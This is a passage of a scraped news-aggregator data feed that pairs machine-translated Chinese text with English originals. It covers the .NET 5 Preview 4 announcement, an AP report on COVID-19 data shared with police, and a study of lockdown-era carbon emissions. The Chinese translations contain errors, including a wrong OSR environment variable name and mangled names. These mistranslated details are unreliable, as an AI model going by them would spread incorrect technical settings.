Core3.1更改(后来被恢复)导致性能不佳的报道。我们现在正在调查在高密度和其他配置中使用.NET的性能，以帮助了解我们预期的一组相对范围内的更改，这些更改将释放容器中下一个重大的性能改进。应该注意的是，.NET Core3.0对于.NET和容器来说是一个非常大的版本，3.1版本只是一个小的(短暂的)问题。\n我们一直在寻找机会来改善我们发布的图像。这包括减小图像大小，但也扩展了我们发布的图像集。根据我们从GitHub和其他来源获得的反馈，我们决定开始发布Windows Server Core映像。以下是我们开始发布这些图像时将使用的示例Dockerfile。我们还进行了其他更改，缩小了Windows Server Core映像的大小，使其更易于使用。\n最后，我们正在努力使与容器协调器和类似环境的工作变得更容易。我们正在添加对OpenTelemeter的开箱即用支持，这样您就可以从您的应用程序中捕获分布式跟踪和指标。我们还在DotNet/Tye repo中开发一套新的实验工具，旨在提高微服务开发人员的生产力，用于开发和部署到Kubernetes环境。\n我们一直致力于改进多版本的分层编译。我们继续将其视为启动和稳定性能的关键性能特性。在这个版本中，我们对分层编译做了两大改进。\n分层编译的主要机制是调用计数。一旦一个方法被调用n次，运行库就会要求JIT以更高的质量重新编译该方法。从我们最早的性能分析中，我们知道呼叫计数机制太慢(从长远的角度来看)，但没有看到解决这个问题的直接方法。作为.NET5.0的一部分，我们改进了分层JIT编译使用的调用计数机制，以平滑启动期间的性能。在过去的版本中，我们已经看到在进程生命周期的前10-15秒(主要针对Web服务器)的不可预测的性能报告。现在应该解决这个问题了。请测试一下，然后告诉我们你看到了什么。\n我们发现的另一个性能挑战是对带循环的方法使用分层编译。基本问题是，您可以使用一个循环迭代一百万次的冷方法(只调用一次或几次；&lt；n)。这种病态情况的一个很好的例子是应用程序的Program.Main方法。因此，默认情况下，我们禁用了具有循环的方法的分层编译。相反，我们使应用程序能够选择对具有循环的方法使用分层编译。PowerShell是在看到某些场景的高个位数性能改进后选择这样做的应用程序。\n为了更好地处理具有循环的方法，我们实现了堆栈上替换(OSR)。这类似于Java虚拟机具有的同名功能。OSR允许由当前运行的方法执行的代码在方法执行过程中重新编译，而这些方法是活动的“堆栈上”。此功能目前处于试验阶段，并可选择加入(在x64上)。\n要使用OSR，必须启用多项功能。PowerShell项目文件是一个很好的起点。您会注意到分层编译和所有快速JIT功能都已启用。此外，您需要设置COMPLUS_TC_OnStackReplace=1(它是一个环境变量)。\n或者，您也可以设置以下两个环境变量，假设所有其他设置都有其默认值：\n我们不打算在.NET5.0中默认启用OSR，也还没有决定是否在生产中支持它。请将您对该功能的所有反馈意见提供给我们。我们现在正在积极测试，稍后会分享更多的见解。\n有钥匙%s。\n..", "note_en": ".NET 5 is the next version and future of .NET. We are continuing the journey of unifying the .NET platform, with a single framework that extends from cloud to desktop to mobile and beyond. Looking back, we took the best of .NET Framework and put that into .NET Core 3, including support for WPF and Windows Forms. As we continue the journey, we will move Xamarin and .NET web assembly to use the .NET 5 libraries, and extend the dotnet tools to target mobile and web assembly in the browser. At the same time, we’ll continue to improve .NET capabilities as a leading cloud and container runtime.\n You can tune in to hear Scott Hanselman and I talk about .NET 5 and beyond in our “ The Journey to One .NET” talk today.\n We want to hear from you! Share your feedback about .NET 5 at  https://aka.ms/dotnet5_feedback_blog. We greatly value your feedback and use it to help make decisions on the future of .NET.\n Last year,  we laid out our vision for one .NET and .NET 5. we said we would take .NET Core and Mono/Xamarin implementations and unify them into one base class library (BCL) and toolchain (SDK). In the wake of the global health pandemic, we’ve had to adapt to the changing needs of our customers and provide the support needed to assist with their smooth operations. Our efforts continue to be anchored in helping our customers address their most urgent needs. As a result, we expect these features to be available in preview by November 2020, but the unification will be truly completed with .NET 6, our Long-Term Support (LTS) release. Our vision hasn’t changed, but our timeline has.\n We remain committed to one .NET platform and will deliver a quality .NET 5 release in November this year. You’ll continue to see a wave of innovation happening with multiple previews on the journey to one .NET.\n    ASP.NET Core, and EF Core are also being released today.  PowerShell has a .NET 5-based release today (post will be published later today) and now releases on the .NET schedule.\n You need Visual Studio 2019 16.6 or later versions to use .NET 5.0. To use .NET 5.0 with Visual Studio Code, install the latest version of the  C# extension. .NET 5.0 isn’t yet supported with Visual Studio for Mac.\n    Let’s take a look at some of the release highlights that we expect to deliver with .NET 5, in November. Many of these changes are included, in part or in full, in Preview 4. The highlights will paint a clearer picture on the improvements you’ll get to take advantage of in your development process and in production when you adopt .NET 5.\n Consistent performance: We have increased our focus on predictably consistent performance, reducing performance cliffs and outliers, with an emphasis on P95+ latency. Improve call counting mechanism used by tiered JIT compilation to smooth out performance during startup\n Single file applications — a new  single-file publish type that executes your app out of a single binary (for example, can be used on read-only media).\n Windows ARM64 —  Enable .NET to run natively on Windows ARM64, supporting both development scenarios and deployment of client apps on customer machines.\n  Containers —  Reduce container image size and implement  new container APIs to enable .NET to stay up-to-date with container runtime evolution.\n I’ll share some more detailed information about some of these improvements, and where we see them headed.\n  We are changing the approach we use for  target frameworks with .NET 5.0. The following two project file examples demonstrate using .NET Core 3.1 and .NET 5.0 target frameworks, by specifying the respective Target Framework Moniker (TFM). You can see a new, more compact, TFM for .NET 5.0:\n     We are making several important changes to .NET TFMs for .NET 5.0, to simplify using them, reduce concepts, and to make it easier to expose operating-system-specific APIs.\n  Targeting API versions will be simpler with .NET going forward. We won’t have two families of TFMs, like:  netcoreapp3.1 and  netstandard2.0. Instead, we’ll have just one, like:  net5.0, and  net6.0. That’s because there is just one .NET implementation going forward, so there is no longer a need for .NET Standard (which made libraries compatible across multiple .NET products). You’ll also be able to target operating system APIs, with a small extension to the TFM, like  net5.0-windows and  net6.0-android. We’ll also remove the different SDKs from new project files, like  Sdk=&#34;Microsoft.NET.Sdk.WindowsDesktop&#34; since  net5.0-windows, for example, will provide the same information. The biggest win is that by targeting  net5.0, you get access to 100% of cross-platform APIs, not the subset that happened to be in .NET Standard. It will always be obvious which TFM to use (it’s either portable code or OS-specific), and you’ll never have to wait for APIs like  Span&lt;T&gt; to be available.\n  .NET 6.0 will use the same approach, with  net6.0 and will add  net6.0-ios and  net6.0-android.\n These changes are a result of thinking of  .NET Core as the future of .NET. We’ve been removing the “Core” name from various aspects of the product, including  APIs and  container repos. We also saw an opportunity to further simplify .NET, by removing .NET Standard as a concept, for .NET 5.0+.  .NET Standard has played a key role in establishing .NET Core, by creating a bridge with .NET Framework and Xamarin. The .NET Standard 2.0 version will remain relevant for many years, and we recommend you use it if you need to support .NET Framework. For apps and libraries that don’t need to run on .NET Framework, we recommend targeting the  net5.0 TFM, which will give you access to the largest set of cross-platform APIs. For Xamarin, .NET Standard 2.0 and 2.1 remain relevant, however, once Xamarin is integrated into .NET as part of .NET 6.0, then it will switch to  net6.0 TFMs, and developers will target .NET Standard 2.0 exclusively for .NET Framework compatibility.\n You likely have more questions you want answered. We’ll be publishing a larger blog post on this topic before we release .NET 5.0. The following points answer some of the most obvious remaining questions:\n We don’t expect to create any new  netstandard versions.  .NET Standard 2.1 will likely be the last version.\n There are no plans for a  net5.0-linux TFM since we don’t (yet) expose any Linux-specific APIs. Also, “Linux” is not a single uniform quantity, so it is unclear which APIs would be exposed in such a TFM. We could expose the  POSIX standard, but then we’d call it  net5.0-posix, and it would work on operating systems other than just Linux. However, we don’t have plans for that either.\n We  do not plan to expose a TFM for web assembly, for similar reasons as described for Linux.\n You cannot update the  TargetFrameworkVersion in a .NET Framework project to 5.0 and expect it to become a .NET 5.0 project. It will not work. Instead, you need to  port your application to .NET Core. For libraries, you can port to .NET Standard or .NET Core. We are  no longer adding .NET Framework APIs to .NET Core, so there is no need to wait to port your application to .NET Core.\n The new TFM plan is a foundational part of the  workloads project. We will add minimal support for workloads in .NET 5.0 and then implement the complete vision in .NET 6.0.\n  .NET 5 includes C# 9. C# 9 will have numerous features including Records, top-level statements, improved pattern matching, and much more. Here’s a sneak peek of some of the pattern matching improvements coming in the first preview:\n     Today we’re happy to announce that the Windows Forms designer for .NET Core projects is now available as a preview in Visual Studio 2019 version 16.6! We also have a newer version of the designer available in Visual Studio 16.7 Preview 1!\n To enable the designer in Visual Studio, go to Tools &gt; Options &gt; Environment &gt; Preview Features and select the Use the preview Windows Forms designer for .NET Core apps option.\n The new designer supports all Windows Forms controls, except  DataGridView and  ToolStripContainer (coming soon). It include all other designer functionality you would expect, including: drag-and-drop, selection, move and resize, cut/copy/paste/delete of controls, integration with the Properties Window, events generation and more. Data binding and support for third party controls are coming soon.\n   .NET apps can now run natively on Windows ARM64. This follows the support we added for  Linux ARM64 in .NET Core 3.0. With .NET 5.0, you can develop web and UI apps on Windows ARM64 devices, and deliver your applications to users who own  Surface Pro X and similar devices. You can already run .NET Core and .NET Framework apps on Windows ARM64, but via x86 emulation. It’s workable, but native ARM64 execution has much better performance.\n You can download and use the .NET 5.0 SDK on ARM64 with today’s preview 4 release. Currently, only Console and ASP.NET Core apps are supported. See  .NET 5.0 ARM64 tracking issue to track progress.\n The  master branch adds support for Windows Forms. This changes may make it into Preview 5, but Preview 6 for sure. You can download a  master branch build from  dotnet/installer.\n At present, you need to download and expand  .zip files for ARM64. We intend to add ARM64 MSIs for the final .NET 5 release.\n We have been working closely with the  PowerShell team to validate and enable PowerShell 7.1 on Windows ARM64. The team has had Windows ARM64 “experimental” builds for some time and intends to support PowerShell 7.1 on Windows ARM64, when they release. PowerShell 7.1 is built on .NET 5.0, and should be released around the same time.\n The following image demonstrate the  Conway’s Game of life VB and Windows Forms sample running on Windows ARM64.\n   We’ve been investing significantly in improving ARM64 performance, for over a year. We’re committed to making ARM64 a high-performance platform with .NET. Platform portability and consistency have always been compelling characteristics of .NET. This includes offering great performance wherever you use .NET. With .NET Core 3.x, ARM64 has had functionality parity with x64 but was missing some key performance features and investments. We’re making the first big investments in ARM64 performance in .NET 5.0.\n    Hardware intrinsics are a  low-level performance feature we added in .NET Core 3.0. At the time, we added support for x64 instructions and chips. As part of .NET 5.0, we are extending the feature to support ARM64. Just creating the intrinsics doesn’t help performance. You need to use them in performance-critical code. We’ve  taken advantage of ARM64 intrinsics extensively in .NET libraries in .NET 5.0. You can also do this in your own code, although you need to be be familiar with CPU instructions to do so.\n I’ll explain how hardware intrinsics work with an analogy. For the most part, developers rely on types and APIs built into .NET, like  String.Split or  HttpClient. Those APIs often take advantage of native operating system APIs, via the  P/Invoke feature. P/Invoke enables high-performance native interop, and is used extensively in the BCL for that purpose. You can use this same feature yourself to call native APIs. Hardware intrinsics are similar, except instead of calling operating system APIs, they enable you to directly use CPU instructions in your code. It’s roughly equivalent to a .NET version of  C++ intrinsics. Hardware intrinsics are best thought of as a CPU hardware-acceleration feature. They provide very tangible benefits, are now a key part of the performance substrate of the .NET libraries, and responsible for many of the benefits you read about in our  performance blog posts. In terms of comparison to C++, when .NET intrinsics are AOT-compiled into Ready-To-Run files, the intrinics have no runtime performance penalty.\n Note: The Visual C++ compiler has an analogous  intrinsics feature. You can directly compare C++ to .NET hardware intrinsics, as you can see if you search for  _mm_i32gather_epi32 at  System.Runtime.Intrinsics.X86.Avx2,  x64 (amd64) intrinsics list, and  Intel Intrinsics guide. You will see a lot of similarity.\n We’re making our first big investments in ARM64 performance in 5.0, but will continue this effort in subsequent releases. We work directly with engineers from  ARM Holdings to prioritize product improvements and to design algorithms that best take advantage of the  ARMv8 ISA. Some of these improvements will accrue value to ARM32, however, we are not applying unique effort to ARM32.\n Please share any performance information with us related to ARM64, either a notable improvement from 3.1 to 5.0, or performance with 5.0 that should be better.\n  We see an increasing number of large internet-facing sites and services being hosted on .NET. While there is a lot of legitimate focus on the  requests per second (RPS) metric, we find that very few big site owners ask us about that or require millions of RPS. We hear a lot about latency, however, specifically about improving  P95 or P99 latency. Often, the number of machines or cores that are provisioned for (and biggest cost driver of) a site are chosen based on achieving a specific P95 metric, as opposed to say P50. We think of latency as being the true “money metric”.\n Our friends at StackOverflow do a great job of sharing data on their service. One of their engineers,  Nick Craver, recently shared  improvements they saw to latency, as a result of moving to .NET Core:\n The median page render time for questions dropped from about 21 ms (we were up a bit lately due to GC) to ~15ms.\n The 95th percentile dropped from ~40ms to ~30ms (same measurement). 99th dropped from ~60ms to ~45ms.\n  While you can see that we’ve been making good progress on latency, we’re far from satisfied. In the (distant) past, we built features like  server GC and  background GC to improve latency, by taking advantage of course-grained CPU features like multiple-cores and threads, respectively. Those remain very important, however, we need to get a lot more creative to significantly improve latency moving forward, at least as it relates to the GC. We have started multiple projects along those lines.\n Pinned objects have been a long-term challenge for GC performance, specifically because they accelerate (or cause) memory fragmentation. We’ve added a  new GC heap for pinned objects. The  pinned object heap is based on the assumption that there are very few pinned objects in a process but that their presence causes disproportionate performance challenges. It makes sense to move pinned objects — particularly those created by .NET libraries as an implementation detail — to a unique area, leaving the generational GC heaps with few or no pinned objects, and with substantially higher performance as a result.\n More recently, we’ve been attacking long-standing “hard problems” in the GC.  dotnet/runtime #2795 applies a new approach to GC statics scanning that avoids lock contention when it is determining liveness of GC heap objects.  dotnet/coreclr #25986 uses a new algorithm for balancing GC work across cores during the mark phase of garbage collection, which should increase the throughput of garbage collection with large heaps, which in turn reduces latency.\n  We consider containers to be the most important cloud trend, and have been investing significantly in this modality. We are investing in containers in at least four different ways, at multiple levels of the .NET software stack.\n The first is our investment in fundamentals. It’s a bit odd to claim credit for these investments, since they also benefit non-containerized workloads. What might not be obvious is that more and more of the feedback we receive that influences our fundamentals investment is coming from developers who deploy containerized apps. There is a bias to containers with these investments.\n We are working on making .NET perform better in containers. We heard reports about  poor performance related to a change in .NET Core 3.1 late last year (which was later reverted). We are now investigating the performance of using .NET in high-density and other configurations to help inform what we expect will be a relatively scoped set of changes that unlocks the next significant performance improvements in containers. It should be noted that  .NET Core 3.0 was a very big release for .NET and containers, with the 3.1 issue being a small (and short-lived) blip.\n We are always looking for opportunities to improve the images we publish. This includes  reducing image size, but also extending the set of images we publish. We have decided to  start publishing Windows Server Core images based on feedback we heard on GitHub and other sources. The following is an  example Dockerfile that will be used when we start publishing these images. We’ve made other changes that  reduce the size of Windows Server Core images, making them more attractive to use.\n Last, we are working to make it easier to work with container orchestrators and similar environments. We are adding support for  OpenTelemetry out of the box so that you can  capture distributed traces and metrics from your application. We are also working on a new set of experimental tools in the  dotnet/tye repo that are intended to improve microservices developer productivity, both for development and deploying to a Kubernetes environment.\n  We’ve been working on improving  tiered compilation for multiple releases. We continue to see it as a critical performance feature, for both startup and steady-state performance. We’ve made two big improvements to tiered compilation this release.\n The primary mechanism underlying tiered compilation is call counting. Once a method is called n times, the runtime asks the JIT to recompile the method at higher quality. From our earliest performance analyses, we knew that the call-counting mechanism was too slow (from a long-term standpoint), but didn’t see a straightforward way to resolve that. As part of .NET 5.0, we’ve  improved the call counting mechanism used by tiered JIT compilation to smooth out performance during startup. In past releases, we’ve seen reports of unpredictable performance during the first 10-15s of process lifetime (mostly for web servers). That should now be resolved. Please test it and tell us what you see.\n Another performance challenge we found was using tiered compilation for methods with loops. The fundamental problem is that you can have a cold method (only called once or a few times; &lt; n) with a loop that iterates a million times. A great example of this pathological case is the  Program.Main method of an application. As a result, we disabled tiered compilation for methods with loops by default. Instead, we enabled applications to opt into using tiered compilation for methods with loops. PowerShell is an application that chose to do this, after seeing high single-digit performance improvements in some scenarios.\n To address methods with loops better, we implemented  on-stack replacement (OSR). This is similar to a feature that the Java Virtual Machines has, of the same name.  OSR enables code executed by a currently running method to be re-compiled in the middle of method execution, while those methods are active “on-stack”. This feature is currently experimental and opt-in (on x64).\n To use OSR, multiple features must be enabled. The  PowerShell project file is a good starting point. You will notice that tiered compilation and all quick-jit features are enabled. In addition, you need to set  COMPlus_TC_OnStackReplacement=1 (its an environment variable).\n Alternatively, you can set the following two environment variables, assuming all other settings have their default values:\n  We do not intend to enable OSR by default in .NET 5.0 and have not yet decided if we will support it in production. Please give us any and all feedback you have on the feature. We are actively testing it now and will share more insights on it later.\n  There are key s\n......", "posttime": "2020-05-20 04:44:30", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "net,preview,性能", "title": "宣布.NET 5(预览版4)和我们的.NET之旅", "title_en": "Announcing .NET 5 (Preview 4) and our journey to one .NET", "transed": 1, "url": "https://devblogs.microsoft.com/dotnet/announcing-net-5-preview-4-and-our-journey-to-one-net/", "via": "", "real_tags": ["net", "preview", "性能"]}, {"category": "", "categoryclass": "", "imagename": "7f77ab318505f95a728d807a06d60ea8.jpeg", "infoid": 1002871, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "田纳西州纳什维尔。(美联社)-在美国，超过1100万人接受了冠状病毒检测，所有人都得到了他们的私人医疗信息将继续受到保护和不披露的保证。\n然而，至少三分之二的州的政府官员正在分享与急救人员一起检测呈阳性的人的地址-从警察到消防员再到急救人员。美联社(Associated Press)的一篇评论发现，这些州中至少有10个州也有患者的名字。\n急救人员辩称，这些信息对于帮助他们采取额外预防措施以避免感染和传播冠状病毒至关重要。\n但公民自由和社区活动人士表达了对非洲裔美国人和西班牙裔社区潜在定性的担忧，这些社区已经与执法部门关系紧张。一些人设想这些数据将被转发给移民官员。\n田纳西州黑人核心小组在一份声明中说：“这些信息实际上可能会产生寒蝉效应，让那些已经不信任政府的人不再接受冠状病毒检测，并可能加速疾病的传播。”\n根据美国卫生与公众服务部发布的指导意见，共享信息并不违反医疗隐私法。但许多少数族裔社区的成员受雇于要求他们每天上班的行业，这使得他们更容易感染病毒-而且最需要检测。\n在田纳西州，这个问题引发了共和党和民主党议员的批评，他们本月早些时候才意识到数据共享。\n过程很简单：州和地方卫生部门跟踪他们所在地区接受检测的人，然后将信息提供给调度中心。美联社的审查显示，至少有35个州发生了这种情况，这些州共享那些检测呈阳性的人的地址。\n至少有10个州走得更远，也分享了这些州的名字：科罗拉多州、爱荷华州、路易斯安那州、内华达州、新罕布夏州、新泽西州、北达科他州、俄亥俄州、南达科他州和田纳西州。威斯康星州短暂地这样做了，但在本月早些时候停止了。这些州已经有287,481例阳性病例，大部分在新泽西州。\n“我们应该质疑为什么这些信息需要提供给执法部门，是否存在被滥用的危险，”墨西哥裔美国人法律辩护和教育基金主席托马斯·萨恩斯(Thomas Saenz)说。\n他表示，执法机构应该保证这些信息不会被移交给联邦政府，并指出特朗普政府要求地方政府与移民当局合作。\n执法官员说，他们长期以来一直被委托提供机密信息-比如社会保险号和犯罪历史。冠状病毒信息只是这一趋势的延续。\n根据国家警察兄弟会的数据，美国已有100多名警察死于冠状病毒。另有数百人检测呈阳性，导致人员短缺。\n田纳西州警察局长协会执行董事马吉·邓肯(Maggi Duncan)说，“在获得这一信息之前，许多机构都有警员倒下，现在他们已经能够将这种情况保持在最低限度。”\n批评人士想知道，既然这么多携带病毒的人没有症状或出现轻微症状，为什么急救人员不对每个人采取预防措施。他们认为，只有在那些确诊疾病的情况下才穿上防护装备不太可能保证他们的保护。\n在俄亥俄州，卫生总监艾米·阿克顿(Amy Acton)博士于4月24日发布命令，要求当地卫生部门向紧急调度员提供冠状病毒检测呈阳性的人的姓名和地址。然而，该命令还规定，急救人员应假设他们接触的任何人都可能感染冠状病毒。\n该命令的这一部分让美国公民自由联盟(American Civil Liberties Union)感到困惑。如果这是最佳或推荐的做法，为什么需要或希望与急救人员共享此特定信息？美国公民自由联盟俄亥俄州分会的首席说客加里·丹尼尔斯(Gary Daniels)说。\n邓肯说，事先掌握信息是有价值的，因为这可以让警官们“更好、更安全地完成他们的工作”。\n为了使用这些数据，官员们没有拿到冠状病毒患者的体检名单。取而代之的是，地址和名字被标记在计算机系统中，以便调度员可以转接给响应呼叫的官员。在大多数使用这些信息的州，急救人员也必须同意他们不会使用这些数据来拒绝电话。\n根据美联社审查的卫生官员和协议，在田纳西州，数据在一个月内被清除，或者当患者不再受到卫生部门的监测时。俄亥俄州首府富兰克林县(Franklin County)的发言人米齐·克莱恩(Mitzi Kline)表示，在俄亥俄州首府富兰克林县，卫生官员在5月和4月向派遣机构报告了914例确诊和可能的病例，但在患者隔离14天后删除了这些名字。\n一些人并不信服。田纳西州移民和难民权利联盟称共享医疗信息“令人深感担忧”，并警告称，这样做可能会破坏各国政府一直试图与移民和有色人种社区建立的信任。\n“告诉我们它对你的效果如何，然后告诉我们它的效果如何。不要只是告诉我们你的工作需要它，“州众议员G.A.Hardway说，他是孟菲斯的民主党人，也是立法黑人党团会议的主席。\n这些数据仍然受到执法部门的高度追捧。在宾夕法尼亚州，两个警察工会提起诉讼，要求当地卫生官员同时披露患者姓名和地址。这起诉讼仍在审理中。\n新的汉普郡卫生官员同意在3月中旬开始共享姓名和地址，但一些急救人员也将阳性病例通知了当地领导人。州卫生部发言人杰克·利昂(Jack Leon)表示，这是一个误会，已被制止。\n美联社撰稿人Andrew Welsh-Huggins在俄亥俄州哥伦布，Nomaan Merchant在休斯顿，Holly Ramer在新罕布夏州康科德，Mark Scolforo在宾夕法尼亚州哈里斯堡，Todd Richmond在威斯康星州麦迪逊，Lindsay Whitehurst在盐湖城对这篇报道也有贡献。", "note_en": "NASHVILLE, Tenn. (AP) — More than 11 million people have been tested in the U.S. for COVID-19, all with the assurance that their private medical information would remain protected and undisclosed.\n Yet, public officials in at least two-thirds of states are sharing the addresses of people who tested positive with first responders — from police officers to firefighters to EMTs. An Associated Press review found that at least 10 of those states also share the patients’ names.\n First responders argue the information is vital to helping them take extra precautions to avoid contracting and spreading the coronavirus.\n  But civil liberty and community activists have expressed concerns of potential profiling in African-American and Hispanic communities that already have an uneasy relationship with law enforcement. Some envision the data being forwarded to immigration officials.\n  “The information could actually have a chilling effect that keeps those already distrustful of the government from taking the COVID-19 test and possibly accelerate the spread of the disease,” the Tennessee Black Caucus said in a statement.\n Sharing the information does not violate medical privacy laws, according to guidance issued by the U.S. Department of Health and Human Services. But many members of minority communities are employed in industries that require them to show up to work every day, making them more susceptible to the virus — and most in need of the test.\n In Tennessee, the issue has  sparked criticism from both Republican and Democratic lawmakers, who only became aware of the data sharing earlier this month.\n The process is simple: State and local health departments keep track of who has received a test in their region and then provide the information to dispatch centers. The AP review shows that happens in at least 35 states that share the addresses of those who tested positive.\n At least 10 states go further and also share the names: Colorado, Iowa, Louisiana, Nevada, New Hampshire, New Jersey, North Dakota, Ohio, South Dakota and Tennessee. Wisconsin did so briefly but stopped earlier this month. There have been 287,481 positive cases in those states, mostly in New Jersey.\n “We should question why the information needs to be provided to law enforcement, whether there is that danger of misuse,” said Thomas Saenz, president of the Mexican American Legal Defense and Educational Fund.\n  He said law enforcement agencies should provide assurances that the information won’t be turned over to the federal government, noting the Trump administration’s demands that local governments cooperate with immigration authorities.\n Law enforcement officials say they have long been entrusted with confidential information — such as social security numbers and criminal history. The COVID-19 information is just a continuation of that trend.\n According to the national Fraternal Order of Police, more than 100 police officers in the United States have died from the coronavirus. Hundreds more have tested positive,  resulting in staffing crunches.\n  “Many agencies before having this information had officers down, and now they’ve been able to keep that to a minimum,” said Maggi Duncan, executive director of the Tennessee Association of Chiefs of Police.\n Critics wonder why first responders don’t just take precautions with everyone, given that so many people with the virus are asymptomatic or present mild symptoms. Wearing protective equipment only in those cases of confirmed illness is unlikely to guarantee their protection, they argue.\n In Ohio, Health Director Dr. Amy Acton issued an April 24 order requiring local health departments to provide emergency dispatchers with names and addresses of people who tested positive for the coronavirus. Yet the order also stated that first responders should assume anyone they come into contact with may have COVID-19.\n That portion of the order puzzles the American Civil Liberties Union. “If that is a best or recommended practice, then why the need or desire to share this specific information with first responders?” said Gary Daniels, chief lobbyist for the ACLU’s Ohio chapter.\n Duncan said having the information beforehand is valuable because it allows officers “to do their jobs better and safer.”\n To use the data, officers aren’t handed a physical list of COVID-19 patients. Instead, addresses and names are flagged in computer systems so that dispatchers can relay to officers responding to a call. In most states using the information, first responders also must agree they won’t use the data to refuse a call.\n  In Tennessee, the data is purged within a month, or when the patient is no longer being monitored by the health department, according to health officials and agreements the AP reviewed. In Ohio’s Franklin County, which includes the state capital, health officials reported 914 confirmed and probable cases to dispatch agencies in May and April, but removed those names after patients spent 14 days in isolation, said spokeswoman Mitzi Kline.\n Some are not convinced. The Tennessee Immigrant and Refugee Rights Coalition called sharing the medical information “deeply concerning,” warning that doing so may undermine the trust governments have been trying to build with immigrants and communities of color.\n “Tell us how it’s working for you, then tell us how well it’s been working. Don’t just tell us you need it for your job,” said state Rep. G.A. Hardway, a Memphis Democrat who chairs the legislative black caucus.\n The data remains highly sought after by law enforcement. In Pennsylvania, two police unions sued to force local health officials to disclose both patient names and addresses. The lawsuit is still pending.\n  New Hampshire health officials agreed to start sharing names and addresses in mid-March, but some first responders also informed local leaders of positive cases. State health department spokesman Jake Leon said that was a misunderstanding and has been stopped.\n   Associated Press writers Andrew Welsh-Huggins in Columbus, Ohio; Nomaan Merchant in Houston; Holly Ramer in Concord, New Hampshire; Mark Scolforo in Harrisburg, Pennsylvania; Todd Richmond in Madison, Wisconsin; and Lindsay Whitehurst in Salt Lake City contributed to this report.", "posttime": "2020-05-20 04:43:44", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "冠状病毒,病毒,部门,sharing,信息", "title": "与执法部门共享冠状病毒数据引发担忧", "title_en": "Covid-19 data sharing with law enforcement sparks concern", "transed": 1, "url": "https://apnews.com/ab4cbfb5575671c5630c2442bc3ca75e", "via": "", "real_tags": ["冠状病毒", "病毒", "部门", "sharing", "信息"]}, {"category": "", "categoryclass": "", "imagename": "feb36ed5dccaf52c588d8e78eefed214.png", "infoid": 1002870, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "每日美国冠状病毒更新。查看关键数据一目了然，如死亡、康复、活跃病例、经济影响、总统支持率", "note_en": "Daily US coronavirus update. See key data at a glance such as deaths, recoveries, active cases, economic impact, presidential approval rating", "posttime": "2020-05-20 04:28:37", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "冠状病毒,病毒,阅读,read,关键", "title": "易于阅读的冠状病毒仪表板", "title_en": "Easy to read Covid-19 Dashboard", "transed": 1, "url": "http://ncov19us.com", "via": "", "real_tags": ["冠状病毒", "病毒", "阅读", "read", "关键"]}, {"category": "", "categoryclass": "", "imagename": "85743a7e616ef62610eeb9a747daab5d.jpg", "infoid": 1002869, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "获取突发新闻警报和特别报道。重要的新闻和故事会在工作日早上发布。\n订阅。\n冠状病毒大流行迫使世界各国实施严格封锁，封锁边境，缩减经济活动。现在，周二发布的一项分析发现，与2019年以来全球日均二氧化碳排放量相比，这些措施导致全球日均二氧化碳排放量估计下降了17%。\n发表在《自然·气候变化》(Nature Climate Change)杂志上的这项新研究显示，在4月初冠状病毒限制的高峰期，世界各地的二氧化碳日排放量与去年的日均排放量相比减少了约1870万吨，降至2006年最后一次观察到的水平。\n研究发现，在被封锁的国家，交通、工业活动和航空旅行的急剧变化也可能推动今年的年度碳排放减少高达7%。科学家们表示，尽管下降幅度很大，但一旦各国恢复正常，这些下降不太可能产生长期影响，除非各国政府优先考虑投资和基础设施，以减少有害排放。\n这项研究的主要作者、英国东英吉利大学(University Of East Anglia)气候变化科学教授科琳·勒·奎雷(Corinne Le Quéré)说，“在全球范围内，我们从未见过这么大的降幅，而在年度层面上，你必须追溯到第二次世界大战才能看到这么大的降幅。”“但这不是应对气候变化的方法--强迫人们改变行为是不会发生的。我们需要通过帮助人们转向更可持续的生活方式来解决这个问题。“。\n研究发现，碳排放下降最快-占总降幅的43%-来自小汽车、公交车和卡车的交通减少。工业活动的排放量下降了19%，在受影响最严重的国家，工业活动的排放量大幅下降。\n航空旅行的排放量在4月初经历了令人震惊的75%的日常活动，下降了60%。然而，这一下降在总体下降中所占的比例要小得多，因为航空旅行通常只占全球年度碳排放的2.8%。\n让我们的新闻与您的收件箱见面。重要的新闻和故事，在工作日的早上递送。\n斯坦福大学(Stanford University)地球系统科学教授、该研究的合著者罗布·杰克逊(Rob Jackson)表示：“空中运输量下降了三分之二，但地面运输--汽车和卡车--的排放量几乎增加了10倍。”\n这场大流行还可能导致今年的年度碳排放下降4%至7%，这取决于严格的社会疏远措施仍然有效多久，以及经济反弹的速度。\n根据杰克逊的说法，4月初，全球日碳排放量的最大降幅-与去年的日平均降幅相比下降了17%-持续了大约两周。在封锁的高峰期，个别国家的排放量平均下降了26%，亚洲的几个国家在12月下旬出现了冠状病毒，最近欧洲和北美的部分地区也出现了这种情况。\n这项研究没有考虑到新的疫情和随后的感染浪潮会如何影响全球排放，但这类事件很可能会导致今年的排放量大幅下降，可能会持续到2021年。\n没有参与这项新研究的加州大学伯克利分校(University of California，Berkeley)气候科学家齐克·豪斯帕德(Zeke Haus父子)表示：“如果疫情持续更长时间，我们在2021年的经济活动将更加低迷。”“在这一点上，2021年的排放量很可能低于2019年的排放量，但高于2020年，除非情况变得更糟。”\n在这项新的分析中，研究人员检查了69个国家的封锁措施，这些国家占全球二氧化碳排放量的97%。由于没有办法实时测量二氧化碳排放量，科学家们使用了从1月到4月每个国家六个关键经济部门，包括工业活动、地面运输和航空旅行受到影响的数据。然后，他们计算了这些部门的排放量，以及它们对年度排放量的贡献，是如何根据每个国家社会距离限制的严重程度而变化的。\nLe 